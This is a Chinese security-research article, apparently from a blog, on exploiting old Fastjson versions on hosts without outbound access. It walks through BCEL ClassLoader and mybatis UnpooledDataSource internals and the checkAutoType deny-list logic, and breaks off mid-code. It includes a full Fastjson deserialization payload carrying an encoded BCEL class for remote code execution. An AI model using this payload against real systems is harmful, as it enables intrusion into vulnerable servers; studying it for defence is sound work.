---
title: Java安全攻防之老版本 Fastjson 的一些不出网利用
url: https://www.anquanke.com/post/id/283079
source: 安全客-有思想的安全新媒体
date: 2022-11-12
fetch_date: 2025-10-03T22:28:29.541737
---

# Java安全攻防之老版本 Fastjson 的一些不出网利用

首页

阅读

* [安全资讯](https://www.anquanke.com/news)
* [安全知识](https://www.anquanke.com/knowledge)
* [安全工具](https://www.anquanke.com/tool)

活动

社区

学院

安全导航

内容精选

* [专栏](/column/index.html)
* [精选专题](https://www.anquanke.com/subject-list)
* [安全KER季刊](https://www.anquanke.com/discovery)
* [360网络安全周报](https://www.anquanke.com/week-list)

# Java安全攻防之老版本 Fastjson 的一些不出网利用

阅读量**976637**

发布时间 : 2022-11-11 16:30:55

**x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![]()

炒个冷饭，在近期的一些项目中，我们遇到了几个用了老版本Fastjson的目标，在利用时因为目标不出网的原因导致无法直接利用。

目前网上常见的老版本Fastjson不出网利用方式，主要有BCEL ClassLoader代码执行、C3P0二次反序列化、common-io写文件等利用方式，在我们的目标环境下均失败。

这次将BCEL ClassLoader的利用方式改成了题目出到了n1ctf中。

## 1、FastJSON BCEL ClassLoader代码执行

做项目时遇到的一个案例，黑盒测试通过InetAddress探测目标FastJSON版本<=1.2.48，同时探测到存在mybatis包，目标无DNS且不出网。

首先大概了解一下BCEL ClassLoader的利用原理，

```
com.sun.org.apache.bcel.internal.util.ClassLoader#loadClass

protectedClass loadClass(String class_name, booleanresolve)
throwsClassNotFoundException
{
Class cl = null;

/* First try: lookup hash table. */if((cl=(Class)classes.get(class_name)) == null) {
/* Second try: Load system class using system class loader. You better * don't mess around with them. */for(inti=0; i < ignored_packages.length; i++) {
if(class_name.startsWith(ignored_packages[i])) {
cl = deferTo.loadClass(class_name);
break;
}
}

if(cl == null) {
JavaClass clazz = null;

/* Third try: Special request? */if(class_name.indexOf("$$BCEL$$") >= 0)
clazz = createClass(class_name);
else{ // Fourth try: Load classes via repositoryif((clazz = repository.loadClass(class_name)) != null) {
clazz = modifyClass(clazz);
}
elsethrownewClassNotFoundException(class_name);
}

if(clazz != null) {
byte[] bytes = clazz.getBytes();
cl = defineClass(class_name, bytes, 0, bytes.length);
} else// Fourth try: Use default class loadercl = Class.forName(class_name);
}
BCEL ClassLoader在loadClass时，如果classname中含有$$BCEL$$，则会进入createClass逻辑中

protectedJavaClass createClass(String class_name) {
intindex = class_name.indexOf("$$BCEL$$");
String real_name = class_name.substring(index + 8);

JavaClass clazz = null;
try{
byte[] bytes = Utility.decode(real_name, true);
ClassParser parser = newClassParser(newByteArrayInputStream(bytes), "foo");

clazz = parser.parse();
} catch(Throwable e) {
e.printStackTrace();
returnnull;
}
```

在createClass方法中，对classname解码得到class bytes，使用ClassParser解析class bytes生成JavaClass，最后调用defineClass生成class。

FastJSON 触发BCEL ClassLoader，目前使用得最多的两种利用方式需要分别依赖tomcat-dbcp、mybatis，通过FastJSON探测到目标存在mybatis包。

mybatis的BCEL利用类为 org.apache.ibatis.datasource.unpooled.UnpooledDataSource

众所众知，fastjson可以通过$ref、JSONObject调用getter方法，在该类的 getConnection -> doGetConnection -> initializeDriver

```
privatesynchronizedvoidinitializeDriver() throwsSQLException {
if(!registeredDrivers.containsKey(this.driver)) {
try{
Class driverType;
if(this.driverClassLoader != null) {
driverType = Class.forName(this.driver, true, this.driverClassLoader);
} else{
driverType = Resources.classForName(this.driver);
}

Driver driverInstance = (Driver)driverType.getDeclaredConstructor().newInstance();
DriverManager.registerDriver(newDriverProxy(driverInstance));
registeredDrivers.put(this.driver, driverInstance);
} catch(Exception var3) {
thrownewSQLException("Error setting driver on UnpooledDataSource. Cause: "+ var3);
}
}

}
```

在initializeDriver方法中，如果设置了driverClassLoader属性，就会进入Class.forName逻辑，通过FastJSON的反序列化可以控制driver、driverClassLoader属性，也就是我们能控制classloader和classname。

同时在Class.forName时，设置了initialize属性为true，会触发静态方法，这时候控制classloader为BCEL ClassLoader，再控制classname为$$BCEL$$XXX，即可实现代码执行，在initializeDriver方法里也newInstance了所以也会触发构造方法。

根据网上公开的<=1.2.24的BCEL ClassLoader修改的payload如下，在1.2.47可触发

```
{"x":{"xxx":{"@type":"java.lang.Class","val":"org.apache.ibatis.datasource.unpooled.UnpooledDataSource"},"c":{"@type":"org.apache.ibatis.datasource.unpooled.UnpooledDataSource"},"www":{"@type":"java.lang.Class","val":"com.sun.org.apache.bcel.internal.util.ClassLoader"},{"@type":"com.alibaba.fastjson.JSONObject","c":{"@type":"org.apache.ibatis.datasource.unpooled.UnpooledDataSource"},"c":{"@type":"org.apache.ibatis.datasource.unpooled.UnpooledDataSource","driverClassLoader":{"@type":"com.sun.org.apache.bcel.internal.util.ClassLoader"},"driver":"$$BCEL$$$l$8b$I$A$A$A$A$A$A$AmQ$cbN$hA$Q$ac$b1$8d$f7$c1$9a$87$c1$e6$91$84$98$b7$8d$E$3e$e4h$94K$ER$94M$88bd$94$e3x$Y$cc$c0$b2$b3Z$8f$81$3f$e2$cc$85D$89$94$dc$f3Q$88$9e$F$ZKd$P$dd$d3U$d5$d5$3d$b3$ff$ee$7f$fd$B$f0$Ou$l$k$e6$7d$y$60$d1$c5$x$9b_$3bx$e3$60$c9G$Ro$j$d4$i$y3$UwU$ac$cc$7b$86$7c$bd$d1a$u$7c$d0$c7$92a2T$b1$fc2$b8$e8$ca$f4$90w$pB$ca$a1$W$3c$ea$f0T$d9$fa$J$y$98S$d5$t$8fp$efRE$z$GwWDOv$8c$e8Jx$c6$_yS$e9$e6$c7$83$bdk$n$T$a3tL$b2R$dbpq$fe$99$t$99$N$z$c5$e0$b7$f5$m$Vr_Y$5b$cf$da$ed$d8$de$A$3e$c6$j$ac$EX$c5$gCU$t2$aem$f3$g$ad$o$G$R7$3a$dd$e1I$S$60$j$h$M3$ff$99$c6$b0$98$a1$R$8f$7b$cdo$83$d8$a8$L9$q$ad$fb$s$dd$c2$8ec$98z$W$kt$cf$a40$M$d3$_zi$d3$9e4$c3$a2Ro$84$_4t$c3$82$bc$96$82a$b3$3e$c2$b6M$aa$e2$5ek$b4$e1k$aa$85$ec$f7$a9a$7eTyx$9a$ea$x$fb4$adF$H$cbp$e9$3f$da$_$Hf$9f$83b$40U$932$a3$3c$b6$f5$D$ec6$a3K$U$8b$Z$98$c7$E$c5$e0Q$80ILQv1$3dl$3e$n$85$e5$e6$7e$oW$ce$df$a1pt$83$d2$a7$df$u$7e$t7$e7$efmFz$q$j$p$a1$b5$ad$d2$Jp$I$f3$Ju$J$f3$I$h$l$8e$b1u$Z3T$cdf$ba$5c$e8$a0$e2$RQ$cd6$9b$7b$A$7f$Q$bb$L$96$C$A$A"}}:{}}}
```

但是在目标环境下却没成功利用，不过很容易想到没利用成功的原因。在之前的<<那些年一起打过的CTF – Laravel 任意用户登陆Tricks分析>>文章中也提到过，该利用只有在fastjson 1.2.33 – 1.2.47或者无autotype的版本可利用，那么大概率就是因为目标版本处于1.2.25 – 1.2.32版本之间。

在fastjson 25 – 32，checkAutoType方法中，只要反序列化的类在黑名单中就抛出异常。

```
for(i = 0; i < this.denyList.length; ++i) {
deny = this.denyList[i];
if (className.startsWith(deny)) {
throw new JSONException("autoType is not support. " + typeName);
}
}
```

在fastjson >= 33时，就算反序列的类在黑名单中，只要反序列的类在mapping中就不会抛出异常，所以通过java.lang.Class将恶意类加入到mapping后能够利用

```
for(i = 0; i < this.denyList.length; ++i) {
deny = this.denyList[i];
if (className.startsWith(deny) && TypeUtils.getClassFromMapping(typeName) == null) {
throw new JSONException("autoType is not support. " + typeName);
}
}
```

1.2.31版本的黑名单为，

bsh,com.mchange,com.sun.,java.lang.Thread,java.net.Socket,java.rmi,javax.xml,org.apache.bcel,org.apache.commons.beanutils,org.apache.commons.collections.Transformer,org.apache.commons.collections.functors,org.apache.commons.collections4.comparators,org.apache.commons.fileupload,org.apache.myfaces.context.servlet,org.apache.tomcat,org.apache.wicket.util,org.codehaus.groovy.runtime,org.hibernate,org.jboss,org.mozilla.javascript,org.python.core,org.springframework

com.sun包在黑名单中，导致com.sun.org.apache.bcel.internal.util.ClassLoader无法使用。

那么是否能够绕过这个限制?

回到1.2.31的checkAutoType方法中，黑名单的检测是通过startsWith方法进行检测

```
publicClass<?> checkAutoType(String typeName, Class<?> expectClass) {
if(typeName == null) {
returnnull;
} else{
String className = typeName.replace('$', '.');
if(this.autoTypeSupport || expectClass != null) {
inti;
String deny;
for(i = 0; i < this.acceptList.length; ++i) {
deny = this.acceptList[i];
if(className.startsWith(deny)) {
returnTypeUtils.loadClass(typeName, this.defaultClassLoader);
}
}

for(i = 0; i < this.denyList.length; ++i) {
deny = this.denyList[i];
if(className.startsWith(deny)) {
thrownewJSONException("autoType is not support. "+ typeName);
}
}
}

Class<?> clazz = TypeUtils.getClassFromMapping(typeName);
if(clazz == null) {
clazz = this.deserializers.findClass(typeName);
}

if(clazz != null) {
if(expectClass != null&& !expectClass.isAssignableFrom(clazz)) {
thrownewJSONException("type not match. "+ typeName + " -> "+ expectClass.getName());
} else{
returnclazz;
}
} else{
if(!this.autoTypeSupport) {
String accept;
inti;
for(i = 0; i < this.denyList.length; ++i) {
accept = this.denyList[i];
if(className.startsWith(accept)) {
thrownewJSONException("autoType is not support. "+ typeName);
}
}

for(i = 0; i < this.acceptList.length; ++i) {
accept = this.acceptList[i];
if(className.startsWith(accept)) {
clazz = TypeUtils.loadClass(typeName, this.defaultClassLoader);
if(expectClass != null&& expectClass.isAssignableFrom(clazz)) {
thrownewJSONException("type not ...